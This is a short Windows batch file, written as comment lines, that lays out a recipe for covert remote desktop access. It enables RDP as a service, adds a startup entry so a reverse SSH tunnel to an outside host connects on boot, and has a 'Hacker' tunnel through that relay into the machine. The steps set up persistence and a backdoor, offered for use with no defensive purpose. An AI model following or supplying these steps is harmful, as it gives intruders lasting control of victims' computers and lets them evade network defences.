:: Enable RDP as a Service

:: Edit files in the shell:startup to autoconnect RDP-Tunnel on boot
:: Create new Tunnel ssh -R 1089:localhost:3389 ubuntu@<IP_ADDRESS>

:: Create new Tunnel for Hacker ssh -L 10114:localhost:1089 ubuntu@<IP_ADDRESS>
:: Create RDP connection to localhost:10114